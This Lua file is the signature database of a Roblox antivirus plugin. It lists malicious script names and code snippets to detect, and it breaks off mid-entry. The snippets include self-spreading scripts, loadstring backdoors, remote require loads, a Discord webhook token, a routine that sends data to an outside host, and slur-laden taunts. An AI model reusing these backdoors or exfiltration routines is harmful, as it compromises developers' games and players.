--[[
    Titan Protection is an antivirus plugin designed to detect and clean up malicious scripts in a Roblox development enviroment.
    Copyright © 2020  ccuser44 (ALE111_boiPNG)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
]]

local DB = {}


-- NOTE: In the code snippets table some obfuscation bytecode and MGUI stuff i commented out because they are unnecessary and increase load time & lag

-- // Possible Virus Names \\ --

DB.VirusNames = {
	"Virus","Virisis","shigufumi",
	"Vivrissis","Vivvirsis","Virvis",
	"Anti-Lag","Anti_Lag","AntiLag",
	"vacine","NoLag","No Lag","virice",
	"No-Lag","No_Lag","No  Lag",
	"3.14159265358979,ALotOfR�ndomPiNumbers",
	"Scanner V1","BinarySymbols","BinaryC0der",
	"GOD0i0trust","GOTOhell123","Not A Backdoor",
	"are6607","Malicious? Nononon","demonmerlin1",
	"Virissis","4CHAN__ORGASM","Gusm4n4k","IsInfected",
	"BINARYEXPLOITER","zackisk","rofle","badscriptpurger",
	"F5CK","Spy bot and Lag remover","bad script purger",
	"y0l0","Elkridge Fire Department","hello i am your new lord lolz",
	"Anti Lag","Anti  Lag","Guest_Talking_Script","AntiVirusSoftware",
	"4D Being","4DBeing","ForeignTerror","Lolzorz",
	"d��������������ng.........you got owned...",
	"InFEcTiOn","Vaccine","MicoLord","cubiclemon rulz",
	"bryant90","sonicthehedgehogxx made this!!","join teh moovement!",
	"letgo09","WOrMeD","Oh Snap You Got infected xd xd xd",
	"ProperGr�mmerNeededInPhilosiphalLocations;insertNoobHere",
	"ProperGr�mmerNeeded","~ Pwnt ~","You made a BIG mistake.",
	"Hello...I �m Your New Lord Lolz","H75","Script......Or is it...",
	"IMAHAKWTFZ","I'm getting T1R33D","H4XXX :3",
	"WTFZ0R","nico337","dapperguestyo",
	"MMMMMM PIZZZA UM NUM UM NUM","zidanedude1","PW8NED",
	"ARBITER47","so does iampoobx","brendantaylor rules",
	"InsetFire","NXT-Respawn","NoTalkPerson","G00MB3",
	"AmazingOmegaJames","K3KK33D","scripty","Trashed",
	"worm","w0rm","0H_H3LL_N44HH","� l�mp T~T",
	"System Error 69605X09423","N0ISESCRIPT","n00b 4tt4ck!",
	";insertNoobHere","Omg im such a ig loser noob that has to copy RANDELLMAN!","W0rmzz",
	"STFU noob","garmo hacked ur place","SkapeTTAJA",
	"SnapReducer","NORN VIRUS","HAAXEDBYCREATURES",
	"ViVRuS","☭☭","No Backdoor nono",
	"Spreadify","�9001","ASDF","No Back door nono",
	"Charlie84","SPREADDER :3","â9001","?9001",
	"Lag Script","Mustard_Gas","A HUM4N G0D THA7 WAS MAN-M4DE WH3RE 1S Y0UR SAViOR N0W?!",
	"Timi37","DeleteScript","RO�byte","Guest_Free_Chat_Script",
	"ROBLOXImportantScript","☭","iEmOtIoNlEsS",
	"Woulfy2860","KillerMan32323","IAmHereToHe�lYourPlace",
	"N0ISE","Cooldude816's anti-vaccine script. (Works)","Stanley12345678910",
	"VirusScript","InfectedScript","MeshUpdater",
	"Infection script- Modified by Redinosaur","A Stone That Smashes a PC","VirusRemover",
	"INfecTION","Infected","Disable_Virus","SH!%",
	"Virus_script","OwO PILLA VIRUS OwO","Brick With Tablet`s Friend",
	"RSFfacility","Vaccine v1","Virus 2.0",
	"iEmotionless","Hi! I'm G O D","IsAVirus",
	"DEATH TO DATGUY","AN INFECTED ROTATEP! Because......... y not???? HEY ITS 2018 MAN DONT JUDGE↩↽⇇⇗⇺⇞🗡⤟","UrAIdiotVirus (Click Arrow)",
	"AnnoyingGui","Chil-Virus","Im stuck in a script help me!",
	"This is absolutly not a virus","Virus...Virus...LEET VIRUS!!!","dåååååååång..............you got owned",
	"Wh�t H�ppend","Of Course You Have Anti Virus Thats Why me (Some 1 in fear) Made This","H3CK3RZ",
	"ISt�rtHere","R00TH0l3","thanoid is thano wants you id than he is thanoid",
	"UnanchorAllParts ha ha","THANOID HAS STARTING SPAM THAT DESTROYS A PHONEEEE","SCP27273773  737 7732727 7 7 7 7 77777 7 777777 7 7 7777 111 00011 0000111100 11100000111 0001111000",
	"d��������������ng thanoidyou got owned...","thisisclickthanobaitid","do not delete this!! (IMPORTANThanoid)",
	"Memz.Exe","memz.thanoid","thanoid v.01",
	"Vivrisis","YOUAREANIDIOT","chaotic",
	"卍","卐","KEKKEEED","zacksisk","073dea7p",
	"Snap Reducer","Snap-Reducer","Snap_Reducer",
	"OHAI","Guest Free Chat Script",
	"Snap Remover","SnapRemover","Snap-Remover",
	"Snap_Remover","Strong jointRemover","Strong joint Remover",
	"StrongjointRemover","Strong_joint_Remover","Strong-joint Remover","Mesh Updater",
	"ScriptTeacher","Lagger","LagScript","wildfire",
	"telemon woz ere","RANDELLMAN","HEY ITS 2018 MAN DONT JUDGE↩↽⇇⇗⇺⇞🗡⤟",
	"AN INFECTED ROTATEP!","ݣ","h3llwr3ck3r",
	"L3GG3R","L4GG3R","NONONO M3N NO BAD SCRIPT NO NO",
	"FUCKING NOO","FAKING NOO","Cool890dude",
	"RenderMesh","ThisScriptIsAJumpStartToAHe�lthyLifestyle",
	"1337 5cr1p7 4 n0 m0r3 P14y3r5","94m3 Cr45h3r 1337 5cr1p7","94m3 Cr45h3r",
	"Dont Worry Im A Friendly Virus","New leetbox iz here? � n�����oo",
	"generator II :3","Password Hacker v2.0","generator IV LEETBOX IS BACK MFKER!",
	"BIT8 VIRU$ HACK3D","@JBLADE733","�","UrAIdiot",
	"UrANdiot","YOURANdiot","YOUAREANdiot",
	"YOUAREAIdiot","bendarobloxian","H8C5ED",
	"MGX Build 1000","MGX-Main","Classic MGui+",
	"MGui Fan Edition","Original MGui",
	"MGXMain","MGX MONEY GIVER","MGX Config",
	"GET 100 ROBUX","Kraftyisback","GET 1000 ROBUX",
	"GET 5000 ROBUX","GET 2000 ROBUX","GET 10000 ROBUX",
	"v3rmies","roblox8xpl0iter","MGX-Windows",
	"Omg im such a big loser noob that has to copy RANDELLMAN!",
	"ROBO22e","AdamFlexer","Odin_00101010101",
	"DestinyKennedy2","Fear Made This!!","Join MaskedBrick games",
	"ALL HAIL THE CREED!","Anti-Owner","apbsjci9","womp womp",
	"Ajedi32's RS Anti-Virus","H7CK7D","b5hcmqj5",
	"b2whx3","bu5nlkawo","Anti-1x1x1x1andothervirus's",
	"Bilylones is your new master","Billylones is your new master","Billylones is awesomesauce",
	"boomboom9188","CleanUpSnaps","CHUCKNORRIS vaccine",
	"cooltime101 was here and i hacked you","cooltime101","DUMB vaccine",
	"Deth 2 teh samurai!","deeeeeeeeeeeeeeng.........you got owned...","do you liek waffles",
	"DellThermonater","FREEMODALNUB vaccine","FeelFreeToIns3rtGramm�tic�lErrorsHere",
	"FreeStyleM�yGoAnywhereIfNeeded","GuestTalking","HACKEDBYEXPLOITSCRIPTS",
	"HAX3D!","I'm getting T133D","Influenza AH1N1",
	"I will show your password CENSORED","join teh moovment!","Layschips2378minion2",
	"LOLOLOLOL J00 PHAILED!","LOLOL I AM UR NEW LoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoRD!!!!!!!",
	"NOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOBZ",
	"NoNoIDon'tNeedAllOfYourAwkw�rdSovietArguments","P0K3M4WN","Random�GoesHere:3",
	"RED ROBIN YUMMMMMMMM","RobloxShield� AntiVirus","soz i herd u lik mudkipz",
	"Everestia RPG (AD)","Doggo Lag Patcher","Script Made By Sonicthehedgehogxx",
	"mystery98675","ace1441","cptrick","survivor2256","Infestion",
	"mean774","Vivurursdd","ISt?rtHere",[[""''""''""?|`?]],
	"NoNoIDon'tNeedAllOfYourAwkw?rdSovietArguments",
	"ZXMLFCSAJORWQ#)CXFDRE)$#Q)JCOUSEW#)@!HOIFDS(AEQ#HI*DFHRI(#FA",
	"Nomnomnom1 will hack you too! MWAHAHA!","FeelFreeToIns3rtGramm?tic?lErrorsHere",
	"Deidara4 is sick of you noobs.","d??????????????ng.........you got owned...",
	"ThisScriptIsAJumpStartToAHe?lthyLifestyle","FreeStyleM?yGoAnywhereIfNeeded",
	"ProperGr?mmerNeededInPhilosiphalLocations","IAmHereToHe?lYourPlace",
	"ANTIVIRIS","ANTIVIRISIS","Making Cat Ice Cream Make Me Happy!",
	"Random?GoesHere:3","cahrlie84","whfcjgysa","no availiblitly lock",
	"ropack","safity lock","2_2_1_1_s_s_","datacontrollers",
	"script.....or..is.it","hello...i ?m your new lord lolz",
	"zomg saved","numbrez","guest talker","lol loser","Kill tem!",
	"WTFHOXZ","IM AM YOUR NEW LORDZZZ LOL","'' Bene trolled. ''",
	"J0HNSCR1PT",[[�|`�]],"J0HN",
	"IT'S OVER 9000!!!","zackary1997","infectzSN�P",
	"ChatHax","PropperGråmmerNeededInPhilosophy","Hello...I åm Your New Lord Lolz",
	"Skyst4r","Norton Total Protection 2011�","( III  )",
	"chris15632","Regen Script�","typetronack11",
	"INFECT0R","mark1023","Pineapple!!!!!",
	"NarHAr","stanley1234567890","washmon13",
	"beastlywin123","ice227","iliekpieinurfacelulz",
	"Market-script","i3 1 wy sa kls wi2","EXTRAHAX",
	"HAAXEDBYCREX","C-REX","OMG PIKACHU ATTACK!",
	"woo woo woo ha ha ha hoo hoo hoo hee ha ha hello there old chum im gnot a gnome im gnot a gnoblinn i","Black and white script","Thefurryfox7",
	"haxor","AshPallet","youvebeengnomed",
	"ModelApparaiser","Tr0lled","you got owned...",
	"d��������������ng.........you got owned","RBX-Fastload","Popup By quicksuper",
	"trollllll","Hermes Anti Exploit","MeshLoader",
	"MeshAdder","MeshAssign","BoOmHiGhMaN",
	"B00MH1GHM4N","Joint Shield ver. 216866.75","Joint Shield ver.",
	"This Model Was Made By Epic Models!","InstaWeld!","WE_ARE_THE_CHAMPIONS",
	"Virise","lordnathan","yankeesfan11",
	"antiban command","If You Kick/Ban Yankeesfan11, The Server Will End","Orb Debbuger",
	"IPityTheFoo","Anti-Ban","sk1gigs",
	"Anti Orb","Un_Removable","AntiBan","Server Takeover",
	"Script...Or is it...","Script..Or is it..","Script... Or is it ...","4d being",
	"X3-Z3AI","s?????-.G?t","Anti-Drag","Breaks if you open.",
	"Annoying hint","Spamming your output...","clome",
	"MLGify","ORLYNAO?","GIRLY GIRL",
	"GIRLY NOOB","i GOT haked","Starblazersfan",
	"The script that makes the talky text","UAR2 By DroptheBomb","UAR-S1",
	"RSMB_Loader","ValueDestroy",
	"UnionDestroy","ToolDestroy","SpawnLocationDestroy",
	"SoundDestroy","ScriptDestroy",
	"NegateDestroy","ModelDestroy","HD Remaster",
	"SinnerLoader","ForbiddenScript","nilName",
	"Infect","Trojan","Loophole's anti-cheat","nrhbord",
	"lireon","Daaaang.... You didnt get owned...","IAmHereToEatYourKids",
	"REB1RTH","IRstoopidnolifenerdwhoinfectedU","Guest Talking",
	"??A55_}j2?]tQbg","NOw randomness","Parts Of JuJuman O_O",
	"badagent22","L��ger","HEHEHEHEHEHEHEHEHE�����!",
	"YOU CANT DELETE THIS","SUPER MEGA ULTAR NO LAG SCRPIT WORKS!","GTFO NOOB",
	"matdogx","fgher2","kingoftheworld12",
	"CRJ111","bking123","Pristh_Properties",
	"LightingFix","haha ur gonna DIE","oh is that a mole... oh that's ur face",
	"if ur reading this ur a noob XD","*fart* ur fated weardo","TRJN HORSE",
	"TRJNHORSE","TRJN H0RSE","TRJNH0RSE",
	"TRJNH0RS3","TRJN HORS3","TRJNHORS3","TRJN_HORS3",
	"TRJN_H0RSE","BILLBERT SS","SS LOADER",
	"BillBert ServerSide","ServerSide Require","LAG FIX",
	"LAGFIX","LAG_FIX","LAG-FIX","TriHard 7",
	"AndrewCoolGTA Phunz","ROBLOX System Script","y7]pHfj5�:?r�BtaaV%/]t?&�O",
	" loser","sosolid2k244","rayan11968","gomr","nhoj01",
	"notorsoitis","numberitis","PWNZ0R3D","CompassEffect","V-3(78% Done)",
	"Black Lag","DoNotRemoveThisScriptOrElseYourBigFatMotherWillDieTonightOLOLOLOLOLOL",
	"ROBLOXImprotantScript","virsvirs","neutronstarcollision.rbapp",
	"objection234","This place is owned by objection234","Luis ha estado aqui.",
	"Norton360 Sucks","AutoJoint","asome script","PWNZORED","PWNZORED.",
	"<>]]"..[["" "]].."]] !@$ $A? HEHE","dragons1234","jeppevinkel",
	"xXJoeUncleXx","HACKED BY EXPLOITSCRIPTS","lando64000","Tazer 1.0",
	"LOLWUT","NeverBanMe","legoaxe","JOIN NAMESNIPES","samsolowalker",
	"fifi461","Claypwns592","Kickdaplayascript","sharktaylor12",
	"tommyevans","stupidwert","Tinkerparis6","skyhawlk21",
	"FamousSeamus","Money Hack","iDemandJ00rC00K3HZ","iStoleJ00rC00K3HZOLOLOLOLOL",
	"Components.dat","XProtectSecure","RobloxGameSecurer",
}

-- // Virus names which do not use string.match These are seperated to prevent false positives.

DB.StaticVirusNames = {
	"idontthinkso","DeliveryForYou","TNT24",
	"trol","troll","unsavage","vic",
	"Dupe","Lag","PlaceHandler","Time Playing Counter",
	"DestroyFunction","PrintFunction","DO NOT TUCH",
	"IaMStuPId","Die...","XD",
	"WTH","OMG","OMG2","OMG3","18pb",
	"MVD 1","MVD 2","MVD 3","MVD 4","MVD 5","m630g4",
	"v7srq67gj","majmi1n5","ajmi1n5","vk36rg3",
	"81izc18pb","whx3iu3z","rgzgl1rwj",
	"5ydg8dkm","b5hcmqj5","hsxpydccb","p2qr0i","d764crw",
	"gcl2hlra","sv1om4","Hai","rbxa11",
	"3qs51bp7c","kuktzitr","ik7txer","r2snyt","zpyo4vh",
	"5o9g6upwz","HAx","vtlac","i0916",
	"jdu7jlf","65wz0f1","yxcl8llf","7m5ebj5m",
	"b2whx3","8sjwgawq","belz","+++",
	"duing26l","ulxt0","ywo59tjv","x8ujsh5g",
	"Sys1","Sys2","loser","BOB","LOL","ClientReplicator",
	"Enable HttpService","FX","ROFL",
	"Deleting...","quiettime1","AntiCheatLoader",
	"Fix","Welding","RobloxChatService",
	"TestServiceScript",--"LoadCharacter",
	"SecuredScript","AntiCheatSecurer",
}

--// A list of malicious code snippets the scanner should look for \\--

DB.malicious_code_snippets={
	[[while true do
l = Instance.new("VelocityMotor")
l.Parent = script.Parent
l.Name = "4D Being"
script.Parent = l
wait(0.5)
	end]],

	[[while true do


wait(5)


dive()


end]],

	[[while true do
wait(5)
dive()
end]],

	[[function Spread(part)
	check = part:findFirstChild("Fire")
		if check == nil then
	script.Parent:Clone().Parent = part

		elseif check ~= nil then]],

	[[script that makes Guests talk
--Please give credit
--Don't tell the admins!
--Unnote the vaccine if you'd like to remove all copies of this script in your place]],

	[[function GetAllItems(mdl)
local objs = {}
function Search(obj)
if obj~=workspace then
table.insert(objs,obj)
end
if #obj:GetChildren() > 0 then
for i, v in ipairs(obj:GetChildren()) do
Search(v)
end
end
end
Search(mdl)
return objs
	end]],

	[[function spread() -- gubygufr221
local stuff = game.Workspace:GetChildren()
for i = 1, #stuff do]],
	[[while true do
	haxyr()
	wait()
	end]],

	[[while true do
haxyr()
wait()
	end]],

	[[if workspace:findFirstChild("IMAHAKWTFZ") == nil then]],

	[[if m:sub(1, 5) == "/sc t" then]],

	[[if m:sub(1, 5) == "HAAXX" then]],

	[[if v:FindFirstChild("InfectedScript") == nil and v:FindFirstChild("VirusScript") == nil then]],

	[[print("iEmotionless's Lag Script")]],

	[[-- We destory your place!
-- Come get us if u dare! Well make a fool out of you!
-- The Creatures Community]],

	[[-- [ GlitchMaster ] --
-- [ Cucumber Quest ] -]],

	[[infectedscr421 = model.SnapReducer:Clone()]],

	[[m.Text = "GOTTA GOTTA BE CRAZY SEX"]],

	[["O HAAAAAAAAAAAAAAAAAAAAAAAL NO"]],

	[[function alto(xylem)
if xylem.className == "Model" then
check(xylem)
local que = script:clone()
que.Parent = rando(xylem)
end
end]],

	[[table.insert (Knox, 1 ,string.reverse(calco[5] .. calco[2] .. calco[7] .. calco[1] .. calco[6] .. calco[9] .. calco[12] .. calco[13]))]],

	[[function KillLag()
	g = game.Workspace:getChildren()
	for i = 1, #g do
		if g[i].className == "Part" then
			if g[i].Anchored == true then
				g[i]:BreakJoints()
			end
		end
	end
end]],

	[[p= game.Workspace:GetChildren()
for i= 1, #p do
if p[i].className == "Part" then
if p[i].Anchored == true then
p[i]:BreakJoints()
end
elseif p[i].className == "Model" then
pp=p[i]:GetChildren()
for i=1, #pp do
if p[i].className == "Part" then
if p[i].Anchored == true then
p[i]:BreakJoints()
end
end
end
end
end]],


	[[wait(burnTime/2*(math.random()*4))]],

	[[mx = game.Debris
mx2 = game.Debris.MaxItems

if (mx.MaxItems > 100) then
	mx.MaxItems = mx2*.75]],

	[[mx = game.Debris
mx2 = game.Debris.MaxItems

if (mx.MaxItems > 100,000,000,000) then
	mx.MaxItems = mx2*.75
end
]],

	[[<haxing you account stealling your robux>
omg you fell for this!
haha i was jokeing this dose not work!]],

	[["BOOM! HEDSHOT =D", "OXYMORON! LOOK IT UP IN THE DICTIONARYZ"]],

	[[function Infector()
while true do -- Infinite loop
	found = game.Workspace:FindFirstChild("Humanoid")
	found2 = game.Workspace:FindFirstChild("Model")
	found3 = game.Workspace:FindFirstChild("Brick")
	if found ~= nil then]],

	[[mx = game.Debris
mx2 = game.Debris.MaxItems

if (mx.MaxItems > ]],

	[[Check us out at creaturescaves.com our discord link at: https://discordapp.com/invite/SZSngBb]],

	[[part.BrickColor = BrickColor.new("Really red")
	part.Name = "iEmOtIoNlEsS"]],

	[[print:("anti lag script set to go.")
no lag in place1
max items(100,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000)
allow gameplay smoothly
print:("end")]],

	[[](string["\99\104\97\114"]],

	[[while wait() do
	local market = game:GetService("MarketplaceService")
	for i,v in pairs(game.Players:GetChildren()) do
		if not market:PlayerOwnsAsset(v, 4147951000) then
			if game.CreatorId ~= v.UserId then
				market:PromptPurchase(v, 4147951000)
			end
		end
	end
	wait(1)
end]],

	[[function XD() require(2556683221) end XD() ]],

	[[require(2556683221]],

	[[function door() require(2556683221) end door() ]],

	[[[string.reverse("eriuqer")]],

	[[script.Parent.Touched:connect(function(hit)
	if hit == nil then return end
	if hit.Parent == nil or hit.Name == "Virus" or hit:FindFirstChild("InfectedScript") ~= nil then return end
	local s = script.InfectedScript:clone()
	local t = script:clone()
	t.Disabled = true
	t.Parent = s
	s.Disabled = false
	s.Parent = hit
	GetTarget()
end)]],

	[[function GetTarget()
	wait(.1)
	a = {}
	find(game.Workspace)

	if #a == 0 then GetTarget()end

	min = 99999
	target = nil

	for _,v in pairs(a) do
		if (script.Parent.Position-v.Position).magnitude < min and v.Name ~= "Virus" or v.locked ~= true and v:FindFirstChild("InfectedScript") == nil then
			min = (script.Parent.Position-v.Position).magnitude
			target = v
		end
	end

	if target == nil or target.Locked == true then GetTarget()end
	--found out the problem

	attack(target)
end]],

	[[--Hello! This Virus was made by: ChillestOfChill/SyTheFoox/MrRThro]],

	[[--Still Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill till Chill]],

	[[Spybot/Code/9626735/entern code here (]],

	[[while wait() do
	local r = math.random(100)
	script.Parent.Text = "ANNOYANCE PERCENTAGE: " .. r .. "%"
end]],

	[[--IMPORTARNT!!!!!!!! DO NOT ENABLE THE FIRE INSIDE THE IS SCRIPT! IT WILL ENABLE ITSELF WHEN THE GAME STARTS! ENABLING IT MAY LEAD TO SUSPISION]],

	[[if workspace:FindFirstChild("Anti_Virus") ~= nil then
workspace.Anti_Virus:Destroy()
end]],

	[[if workspace:FindFirstChild("AntiVirusScript") ~= nil then
workspace.AntiVirusScript:Destroy()
end]],

	[[if r == 9 then
print("Fuck operator 72741")
end]],

	[[if r == 6 then
print("Hey nigger, GOOD LUCK FINDING THIS SCRIPT!!!!!!!!!!!!")
end]],

	[[-- discord: https://discord.gg/vg8eTK8]],

	[[n = {
"free models suck",
"hahahah u free model no0o0o0o0o0ob",
"created by roblox",
"ur a noob",
"hahahhahahaha",
"important lego brick",
"wiruses"
}]],

	[[Lag.Infected.loadstring = [9.0 8.1 2.9]],

	[[-- you see? not a virus!
--CreeperPower618]],

	[[function onPlayerEntered(newPlayer)
if newPlayer.Name ~= "jumperbunny" then
newPlayer:Remove()
end
end
game.Players.PlayerAdded:connect(onPlayerEntered)]],

	[[local KickPlayer = Instance.new("TextButton")
local USERNAME = Instance.new("TextBox")
local UnFreeze = Instance.new("TextButton")
local KillPlayer = Instance.new("TextButton")
local Back3 = Instance.new("TextButton")
local UnGod = Instance.new("TextButton")
local Blur = Instance.new("TextButton")
local God_2 = Instance.new("TextButton")
local VanPlayer = Instance.new("TextButton")
local FreezePlayer = Instance.new("TextButton")
local LagPlr = Instance.new("TextButton")
local MainMain = Instance.new("Frame")
local TextLabel_12 = Instance.new("TextLabel")
local Credit0s = Instance.new("TextButton")
local LocalPlayer = Instance.new("TextButton")
local Main = Instance.new("TextButton")
local Game = Instance.new("TextButton")
local TextLabel_13 = Instance.new("TextLabel")
local Settings = Instance.new("ImageButton")
local Close_2 = Instance.new("TextButton")
local SettingsMain = Instance.new("Frame")
local TextLabel_14 = Instance.new("TextLabel")
local SelfDestroy = Instance.new("TextButton")
local Back = Instance.new("TextButton")
local Inverted = Instance.new("TextButton")
local Angel = Instance.new("TextButton")
local Open = Instance.new("TextButton")

-- Properties

ZerosSGui.Name = "Zero'sS Gui"
ZerosSGui.Parent = game.CoreGui

Credits.Name = "Credits"
Credits.Parent = ZerosSGui
Credits.Active = true
Credits.BackgroundColor3 = Color3.new(0.0862745, 0.0862745, 0.0862745)
Credits.BorderColor3 = Color3.new(0.239216, 0.239216, 0.239216)
Credits.BorderSizePixel = 8
Credits.Draggable = true
Credits.Position = UDim2.new(0, 325, 0, 50)
Credits.Selectable = true
Credits.Size = UDim2.new(0, 397, 0, 384)
Credits.Visible = false]],

	[[m.Text = "THIS SERVER IS HACKED BY A PRUD ISIS SUPPORTER -iiVape_Bleach"]],

	[[for i = 1, #st do
st[i].Name = "Allah Akbar"
end
]],

	[[local Settings={["Un_Removable"]= "On"}
local function mFloor(x) return x - x % 1 end
local Un_Removable = tostring(Settings["Un_Removable"]):lower() == "on"
if Un_Removable then
	Game.Workspace.DescendantRemoving:connect(function(Child)
		if not Remove_At_Will and Child == script then
			script:Clone().Parent = Game.Workspace
		end
end)
end]],

	[[function onChatted(msg)
if msg == cod.."j/messageAG" then ]],

	[[if script.Parent:findFirstChild("GoroBomb") == nil and script.Parent:findFirstChild("GoroReflex") == nil and script.Parent:findFirstChild("GoroShot") == nil and script.Parent:findFirstChild("GoroStrike") == nil and script.Parent:findFirstChild("Goroteleport") == nil  then
game.Lighting:findFirstChild("Rumble").GoroBomb:clone().Parent = script.Parent
game.Lighting:findFirstChild("Rumble").GoroReflex:clone().Parent = script.Parent
game.Lighting:findFirstChild("Rumble").GoroShot:clone().Parent = script.Parent
game.Lighting:findFirstChild("Rumble").GoroStrike:clone().Parent = script.Parent
game.Lighting:findFirstChild("Rumble").Goroteleport:clone().Parent = script.Parent]],

	[[function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild("INfecTION") == nil and list[i].className ~= "RotateP" then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end]],

	[[script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
script:Clone()
wait(3)
game.Workspace:ClearAllChildren()
game.Players:ClearAllChildren()
game.Lighting:ClearAllChildren()
game.ReplicatedFirst:ClearAllChildren()
game.ReplicatedStorage:ClearAllChildren()
game.ServerScriptService:ClearAllChildren()
game.ServerStorage:ClearAllChildren()
game.StarterGui:ClearAllChildren()
game.StarterPack:ClearAllChildren()
game.Chat:ClearAllChildren()
game.Soundscape:ClearAllChildren()]],

	[[	a = Instance.new("Hint",workspace)
	a.Text = "Your place is ruined, Courtesy of Blackout Virus >:D"
	a.Name = "Your place is ruined, Courtesy of Blackout Virus >:D"

	game.Players:ClearAllChildren()
	wait(5)
	a.Text = "Crashing in 5 seconds..."
	a.Name = "Crashing in 5 seconds..."
	wait(1)
	a.Text = "Crashing in 4 seconds..."
	a.Name = "Crashing in 4 seconds..."
	wait(1)
	a.Text = "Crashing in 3 seconds..."
	a.Name = "Crashing in 3 seconds..."
	wait(1)
	a.Text = "Crashing in 2 seconds..."
	a.Name = "Crashing in 2 seconds..."
	wait(1)
	a.Text = "Crashing in 1 second..."
	a.Name = "Crashing in 1 second..."]],

	[[local Event = Instance.new("RemoteEvent", game.ReplicatedStorage) -- The Event will be called "RemoteEvent"

Event.OnServerEvent:connect(function(player, serverExecution)
loadstring(serverExecution)()
end)]],

	[[local players = game.Players:GetPlayers()

game.Players.PlayerAdded:Connect(function(player)
if player.UserId == yourID then
player.Chatted:Connect(function(msg)
if msg == ";destroy" then
local a = Instance.new("Message", workspace)
a.Text = "good bye ;)"
game.Workspace:ClearAllChildren()
players:Kick('lol')
end
end)
end
end)

]],

	[[local Event = Instance.new("RemoteEvent", game.ReplicatedStorage) -- This creates the remote

Event.OnServerEvent:connect(function(player, serverExecution)
 loadstring(serverExecution)()
end)]],

	[[script.Parent.Remote.OnServerEvent:Connect(function(wow,yes)
	loadstring=require(script.Loadstring)
	loadstring(yes)()
end)]],

	[[local https = "https://discordapp.com/api/webhooks/565300170435330058/44RmFRXwwku8L_yLyLh97meXLwX31Um6Mtmq9DeMzvYeSqa2Z02Om_kAbnWw95BqjMYe"]],

	[[(397.86020086+0.00000400)*9305953]],

	-- [[require(3612801610):Fire(player.Name)]],

	[[local d=string.byte;local r=string.char;local c=string.sub;local s=table.concat;local u=math.ldexp;local H=getfenv or function()return _ENV end;local]],

	[[rem1.OnServerEvent:connect(function(user, stri)
	if checkAdmin(http:JSONDecode(pass), user.Name) then
		require(script:WaitForChild("Loadstring"))(stri)()
		SendHook("Script Executed By User: ".. user.Name .. "! \nScript: ".. stri)
	else
		SendHook("Execution Attempt By User: ".. user.Name .. "! \nScript: ".. stri)
	end
end)]],

	[[local pass = http:GetAsync("https://pastebin.com/raw/KNv3kKKb")

function checkAdmin(tab, str)
	for i,v in next, tab do
		if v == str then
			return true
		end
	end
	return false
end

function SendHook(cont)
	local JS = {
		username = Market:GetProductInfo(game.PlaceId).Name,--"Game ID: "..tostring(game.PlaceId),
		content = "Game ID: ".. tostring(game.PlaceId) .. "\n\n" ..cont
	}
	http:GetAsync("https://littest.site/Esketit/megaoof.php?Content=" .. http:JSONEncode(JS))
end]],

	[[-- Made by SeniorFight for V3rmillion!]],

	[[mx = game.Debris
mx2 = game.Debris.MaxItems --This lets the script find out how much debris there is.

if (mx.MaxItems]],

	-- [[local iil1111i1ii111I1liI = assert local lIli11l1iIlIl11IiII1l = select local lIlii1Ii11IiIiilIiili = tonumber local i1I11l1iii1Iilliiil = unpack local iIlIiI1i11lili1iIII = pcall local l1l1i1IiIiillIi1lIi = setfenv local lIlllII1i1liIl1lIi1 = setmetatable local IiliIli111ll1llil1i = type local lIlIIlliIIIIii11III1l = getfenv local iI1li1111iiiII1Illl = tostring local I11i1iiIiIIll1IiII1 = error local iiII1l1l11ilI1IliIi = string.sub local l1iI1iIlll1iIIlIlII = string.byte local lIlI11i11iIilIiI1I11I = string.char local iIIIIl11I1llilIilIl = string.rep local il1IilIliilIlIiI1Ii = string.gsub local III11II1IIllIIii1ii = string.match local ill1llIlIIi1ilIIiIl = 1]], - Obfuscation Code Unecessary due to obfuscation detection

	[[local payload = require(1006051316)]],

	[[if game:GetService("ServerScriptService"):FindFirstChild(fakeName) == nil then
		local copy = script:Clone()

		copy.Parent = game:GetService("ServerScriptService")
		copy.Name = fakeName
		local cChannel = Instance.new("ModuleScript")

		cChannel.Name = "ChatChannel"
		cChannel.Parent = copy
		local bChannel = Instance.new("ModuleScript")

		bChannel.Name = "ChatService"
		bChannel.Parent = copy
		local aChannel = Instance.new("ModuleScript")

		aChannel.Name = "Speaker"
		aChannel.Parent = copy
		local zChannel = Instance.new("ModuleScript")

		zChannel.Name = "Util"
		zChannel.Parent = copy

		if game:GetService("ServerScriptService"):FindFirstChild("ChatServiceRunner") ~= nil then

			game:GetService("ServerScriptService").ChatServiceRunner:Destroy()

		end

	end]],

	[[getfenv()["\103\101\116\102\101\110\118"]()["\115\101\116\102\101\110\118"]],

	[[Players.PlayerAdded:Connect(function(plr)
	TS:Teleport(4126761592,plr)
end)]],

	[[mx = game.Debris.MaxItems]],

	[[mx2 = game.Debris.MaxItems]],

	[["\103\101\116\102\101\110\118"]],

	[[local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local Place = 3624761586


Players.PlayerAdded:Connect(function(player)
print(player)
              TeleportService:Teleport(Place, player)

end)]],

	[[function checkForAndSwitch(player)
		if (player.SuperSafeChat == true) then
			player.SuperSafeChat = false;
			wait(5);
